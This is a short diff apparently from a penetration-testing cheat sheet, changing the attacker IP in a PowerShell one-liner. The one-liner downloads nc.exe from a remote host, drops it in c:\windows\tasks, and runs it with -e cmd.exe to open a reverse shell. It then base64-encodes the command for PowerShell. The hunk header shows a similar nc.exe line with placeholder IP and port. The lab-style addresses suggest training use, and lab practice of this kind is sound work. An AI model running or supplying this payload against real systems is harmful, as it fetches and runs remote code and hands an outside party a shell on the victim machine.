@@ -94,7 +94,7 @@ c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;
 Quick encode on Linux:
 
 ```bash
-echo -n '(new-object net.webclient).downloadfile("http://10.10.17.176:4443/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv 10.10.17.176 4444 -e c:\windows\system32\cmd.exe;' \
+echo -n '(new-object net.webclient).downloadfile("http://10.10.16.137:4443/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv 10.10.16.137 4444 -e c:\windows\system32\cmd.exe;' \
   | iconv -t UTF-16LE | base64 -w0
 ```
 
